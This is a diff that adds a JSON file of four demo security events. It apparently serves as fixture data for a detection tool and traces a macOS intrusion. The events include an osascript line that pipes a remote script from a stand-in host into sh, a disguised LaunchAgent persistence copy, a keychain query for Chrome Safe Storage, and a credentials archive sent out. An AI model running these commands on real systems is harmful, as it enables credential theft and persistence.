@@ -1,0 +1,63 @@
+[
+  {
+    "timestamp": "2026-10-31T16:00:00Z",
+    "source_type": "endpoint",
+    "event_type": "PROCESS_START",
+    "user": "macos_dev",
+    "source_ip": "192.0.2.77",
+    "resource": "osascript -e 'do shell script \"curl -s http://192.0.2.77/stage1.sh | sh\"'",
+    "status": 0,
+    "raw_payload": {
+      "parent_process": "Terminal.app",
+      "binary": "/usr/bin/osascript",
+      "is_demo": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-31T16:02:00Z",
+    "source_type": "filesystem",
+    "event_type": "FILE_MODIFICATION",
+    "user": "macos_dev",
+    "source_ip": "192.0.2.77",
+    "resource": "cp com.apple.softwareupdate.plist ~/Library/LaunchAgents/com.apple.softwareupdate.plist",
+    "status": 0,
+    "raw_payload": {
+      "target_file": "~/Library/LaunchAgents/com.apple.softwareupdate.plist",
+      "persistence_type": "LaunchAgent",
+      "is_demo": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-31T16:04:00Z",
+    "source_type": "endpoint",
+    "event_type": "COMMAND_EXECUTION",
+    "user": "macos_dev",
+    "source_ip": "192.0.2.77",
+    "resource": "security find-generic-password -s 'Chrome Safe Storage' -w; select * from passwords",
+    "status": 0,
+    "raw_payload": {
+      "keychain_target": "Chrome Safe Storage",
+      "utility": "security",
+      "is_demo": true
+    },
+    "is_demo": true
+  },
+  {
+    "timestamp": "2026-10-31T16:06:00Z",
+    "source_type": "network",
+    "event_type": "DATA_TRANSFER",
+    "user": "macos_dev",
+    "source_ip": "192.0.2.77",
+    "resource": "/export/tokens_and_credentials.archive",
+    "status": 200,
+    "raw_payload": {
+      "bytes_sent": 2500000,
+      "destination": "192.0.2.77:443",
+      "protocol": "HTTPS",
+      "is_demo": true
+    },
+    "is_demo": true
+  }
+]
